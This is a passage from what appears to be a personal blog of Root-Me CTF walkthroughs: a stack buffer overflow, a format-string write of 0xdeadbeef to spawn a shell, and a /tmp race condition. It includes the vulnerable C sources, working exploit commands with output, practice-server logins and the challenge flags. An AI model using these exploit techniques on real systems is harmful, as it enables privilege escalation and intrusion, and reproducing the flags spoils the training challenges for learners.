app-systeme-ch35@challenge03:~$ (python -c 'print(268*"a"+4*"b"+8*"c"+"\xe7\x05\x40\x00\x00\x00\x00\x00")'; cat) | ./ch35
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

ls -a
.  ..  ._perms	.git  .passwd  ch35  ch35.c
cat .passwd 
B4sicBufferOverflowExploitation

exit
app-systeme-ch35@challenge03:~$ 
~~~
  
</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
B4sicBufferOverflowExploitation
~~~

</details>

---

### [App - System](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## ELF x86 Format string bug basic 2

- Author: Lyes
- Date: 8 April 2015
- Points: 20
- Level: 2

### Statement

<details>

<summary markdown="span">Source Code</summary>

~~~c
    #include <stdio.h>
    #include <stdlib.h>
    #include <sys/types.h>
    #include <unistd.h>
     
    int main( int argc, char ** argv )
     
    {
     
            int var;
            int check  = 0x04030201;
     
            char fmt[128];
     
            if (argc <2)
                    exit(0);
     
            memset( fmt, 0, sizeof(fmt) );
     
            printf( "check at 0x%x\n", &check );
            printf( "argv[1] = [%s]\n", argv[1] );
     
            snprintf( fmt, sizeof(fmt), argv[1] );
     
            if ((check != 0x04030201) && (check != 0xdeadbeef))    
                    printf ("\nYou are on the right way !\n");
     
            printf( "fmt=[%s]\n", fmt );
            printf( "check=0x%x\n", check );
     
            if (check==0xdeadbeef)
            {
                    printf("Yeah dude ! You win !\n");
                    setreuid(geteuid(), geteuid());
                    system("/bin/bash");
            }
    }
~~~

</details>

### Connection Details

- Host: challenge02.root-me.org
- Protocol: SSH
- Port:2222
- SSH access: ssh -p 2222 app-systeme-ch14@challenge02.root-me.org 
- Username: app-systeme-ch14
- Password: app-systeme-ch14

### Resources

1. [PHRACK - Advances in format string exploitation](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20PHRACK%20-%20Advances%20in%20format%20string%20exploitation.pdf).
2. [DEFCON 18 Advanced Format String Attacks](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20DEFCON%2018%20Advanced%20Format%20String%20Attacks.pdf).
3. [Format String and Double-Free Attacks](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Format%20String%20and%20Double-Free%20Attacks.pdf).

### Solutions

<details>

<summary markdown="span">Solution</summary>

Reviewing the source code we can see the protected sprintf function that defines the buffer length, thus there is no buffer overflow risk:

~~~c
snprintf( fmt, sizeof(fmt), argv[1] );
~~~

We can also see the buffer, fmt, is limited to 128 bytes:

~~~c
char fmt[128];
~~~

We can extract data from the stack by using a memory pointer as argv:

~~~shell
app-systeme-ch14@challenge02:~$ ./ch14 %08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x
check at 0xbffffa88
argv[1] = [%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x]
fmt=[080485f1,00000000,00000000,000000c2,bffffbd4,b7fe1449,f63d4e2e,04030201,34303830,31663538,3030302c,30303030,30302c30,30303030,3]
check=0x4030201
~~~

This provides values from further up the stack.  We can see the "check" variable (0x04030201) in the stack.  We will need to overwrite this value with 0xdeadbeef to break into bash shell.  We can input some string to find the location of the fmt buffer in relation to the check variable in the stack, using 8x"a" = 0x61616161, 0x61616161, we can see the user input is adjacent to the check variable:

~~~shell
app-systeme-ch14@challenge02:~$ ./ch14 aaaaaaaa%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x
check at 0xbffffa88
argv[1] = [aaaaaaaa%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x]
fmt=[aaaaaaaa080485f1,00000000,00000000,000000c2,bffffbd4,b7fe1449,f63d4e2e,04030201,61616161,61616161,34303830,31663538,3030302c,30]
check=0x4030201
~~~

We can use %n in the user input to point to an address. We can format a user input with ADDRESS + %WIDTHx + $9%hn where ADDRESS = 0xbffffa88, $9%hn is the position in the stack of our input and WIDTH is a value that is written to change the check variable.  Due to limitations in the user input, we need to split this input to write to two addresses. The full command is:

~~~shell
app-systeme-ch14@challenge02:~$ ./ch14 $(python -c "print('\xb8\xfa\xff\xbf'+'\xba\xfa\xff\xbf'+'%48871x%9\$hn'+'%8126x%10\$hn')")
check at 0xbffffab8
argv[1] = [��������%48871x%9$hn%8126x%10$hn]
fmt=[��������                                                                                                                       ]
check=0xdeadbeef
Yeah dude ! You win !
app-systeme-ch14-cracked@challenge02:~$ cat .passwd
1l1k3p0Rn&P0pC0rn
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
1l1k3p0Rn&P0pC0rn
~~~

</details>

---

### [App - System](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---
    
## ELF x86 Race Condition

- Author: Lu33Y
- Date: 8 February 2012
- Points: 20
- Level: 2

### Statement

<details>

<summary markdown="span">Source Code</summary>

~~~c
    #include <stdio.h>
    #include <string.h>
    #include <sys/ptrace.h>
    #include <unistd.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <stdlib.h>
     
    #define PASSWORD "/challenge/app-systeme/ch12/.passwd"
    #define TMP_FILE "/tmp/tmp_file.txt"
     
    int main(void)
    {
      int fd_tmp, fd_rd;
      char ch;
     
     
      if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0)
        {
          printf("[-] Don't use a debugguer !\n");
          abort();
        }
      if((fd_tmp = open(TMP_FILE, O_WRONLY | O_CREAT, 0444)) == -1)
        {
          perror("[-] Can't create tmp file ");
          goto end;
        }
       
      if((fd_rd = open(PASSWORD, O_RDONLY)) == -1)
        {
          perror("[-] Can't open file ");
          goto end;
        }
       
      while(read(fd_rd, &ch, 1) == 1)
        {
          write(fd_tmp, &ch, 1);
        }
      close(fd_rd);
      close(fd_tmp);
      usleep(250000);
    end:
      unlink(TMP_FILE);
       
      return 0;
    }
~~~

</details>

### Connection Details

- Host: challenge02.root-me.org
- Protocol: SSH
- Port:2222
- SSH access: ssh -p 2222 app-systeme-ch12@challenge02.root-me.org 
- Username: app-systeme-ch12
- Password: app-systeme-ch12

### Resources

1. [Secure Coding in C and C++ Race Conditions](https://repository.root-me.org/Programmation/C%20-%20C++/EN%20-%20Secure%20Coding%20in%20C%20and%20C++%20Race%20Conditions.pdf).
2. [Race Donsition Vulnerability Lab](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/EN%20-%20Race%20Condition%20Vulnerability%20Lab.pdf).
3. [Exploiting Unix File-System Race Condition via Algorithmic Complexity Attacks](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Exploiting%20Unix%20File-System%20Race%20Condition%20via%20Algorithmic%20Complexity%20Attacks.pdf).

### Solutions

<details>

<summary markdown="span">Solution</summary>

This program is an example of a race condition in which multiple processes access and manipulate the same data concurrently.  For this, the program opens and stores the answer in a file created in /tmp/tmp_file.txt:

~~~c
#define PASSWORD "/challenge/app-systeme/ch12/.passwd"
#define TMP_FILE "/tmp/tmp_file.txt"
...
fd_tmp = open(TMP_FILE, O_WRONLY | O_CREAT, 0444)
...
fd_rd = open(PASSWORD, O_RDONLY)
...
while(read(fd_rd, &ch, 1) == 1)
{
    write(fd_tmp, &ch, 1);
}
close(fd_rd);
close(fd_tmp);
~~~

This copies the flag to a new file, it then pauses for a short period (usleep) and unlinks the temporary file:

~~~c
usleep(250000);
...
unlink(TMP_FILE);
~~~

During this 0.25 seconds, we need to access the file.  We can pipe the program to an external bash command to exploit this race condition at the sleep point:

~~~shell
$ ./ch12 | cat /tmp/tmp_file.txt
eh-q8dEa8q19f9aF()"2a96q92
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
eh-q8dEa8q19f9aF()"2a96q92
~~~

</details>

---

### [App - System](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---
     
Last updated April 2022.

## [djm89uk.github.io](https://djm89uk.github.io)
